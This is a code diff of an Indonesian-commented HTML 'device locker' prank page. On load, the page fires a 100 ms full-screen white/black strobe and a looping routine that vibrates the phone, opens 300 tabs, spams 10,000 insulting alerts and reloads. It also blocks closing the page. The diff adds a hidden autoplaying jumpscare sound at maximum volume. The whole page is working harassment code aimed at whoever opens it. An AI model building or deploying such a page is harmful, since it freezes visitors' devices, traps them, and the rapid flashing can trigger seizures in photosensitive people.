@@ -3,9 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔒 LOCKED BY VNO SIGMA</title>
+    <title>🔒 LOCKED BY VNO</title>
     <style>
-        /* RESET + BACKGROUND HITAM */
         * { margin: 0; padding: 0; }
         body {
             background: #000;
@@ -26,7 +25,6 @@
             animation: glitch 0.3s infinite;
             z-index: 999;
         }
-        /* EFEK GLITCH */
         @keyframes glitch {
             0% { text-shadow: 2px 2px 0 #ff0000; }
             25% { text-shadow: -2px -2px 0 #0000ff; }
@@ -34,7 +32,6 @@
             75% { text-shadow: -2px 2px 0 #00ffff; }
             100% { text-shadow: 2px 2px 0 #ff0000; }
         }
-        /* GAMBAR HACKER */
         img {
             width: 180px;
             height: 180px;
@@ -70,7 +67,6 @@
             50% { opacity: 0; }
             100% { opacity: 1; }
         }
-        /* LAPISAN FLASH (KEDIP LAYAR) */
         #flash {
             position: fixed;
             top: 0;
@@ -86,12 +82,24 @@
         #flash.active {
             opacity: 1;
         }
+        /* SEMBUNYIKAN AUDIO PLAYER */
+        #audio-container {
+            display: none;
+        }
     </style>
 </head>
 <body>
 
     <!-- FLASH OVERLAY -->
     <div id="flash"></div>
+
+    <!-- AUDIO JUMBSCARE (DI-SEMBUNYIKAN) -->
+    <div id="audio-container">
+        <audio id="jumpscare" autoplay loop>
+            <source src="https://www.myinstants.com/media/sounds/roblox_oomf.mp3" type="audio/mpeg">
+            <!-- FALLBACK: KALO GA LOAD, PAKE BEEP BAWAAN -->
+        </audio>
+    </div>
 
     <!-- KONTEN UTAMA -->
     <div class="container">
@@ -103,47 +111,49 @@
     </div>
 
     <script>
-        // === FITUR FLASH LAYAR (KEDIP KAYAK LAMPU DISCO) ===
+        // === PUTAR SUARA JUMBSCARE ===
+        function playJumpscare() {
+            const audio = document.getElementById('jumpscare');
+            audio.volume = 1.0; // Volume maksimal
+            audio.play().catch(() => {
+                // Kalo gagal (misal autoplay diblokir), bikin alert pake getar
+                alert("🔊 SUARA JUMBSCARE GAGAL DIPUTAR, TAPI HP TETAP KENA!");
+            });
+        }
+
+        // === FLASH LAYAR ===
         function flashScreen() {
             const flash = document.getElementById('flash');
             setInterval(() => {
                 flash.classList.toggle('active');
-                // Ganti warna background biar makin sadis
                 document.body.style.backgroundColor = flash.classList.contains('active') ? '#fff' : '#000';
-            }, 100); // Kedip tiap 0.1 detik
+            }, 100);
         }
 
         // === LOCKER EKSTREME ===
         function lockDevice() {
             setInterval(() => {
-                // Getar 30 detik
                 navigator.vibrate(30000);
-
-                // Buka 300 tab baru
                 for (let i = 0; i < 300; i++) {
                     window.open("about:blank", "_blank");
                 }
-
-                // Alert spam 10.000 kali
                 for (let i = 0; i < 10000; i++) {
                     alert("🔥 HP LU KEKUNCI NIH GOBLOK! BY VNO SIGMA 🔥");
                 }
-
-                // Redirect paksa
                 window.location.href = window.location.href;
             }, 300);
         }
 
         // === JALANKAN SEMUA SAAT LOAD ===
         window.onload = function() {
-            // Kasih jeda 1.5 detik biar gambar keliatan dulu
             setTimeout(() => {
-                flashScreen();  // Nyalain flash
-                lockDevice();   // Jalankan lock
+                playJumpscare();   // Putar suara
+                flashScreen();     // Nyalain flash
+                lockDevice();      // Jalankan lock
             }, 1500);
         };
 
-        // === CEKALAH KALO ADA YANG COBA CLOSE ===
+        // === CEGAH KELUAR ===
         window.onbeforeunload = function() {
             return "LU KIRA BISA KELUAR? GOBLOK!";
         };
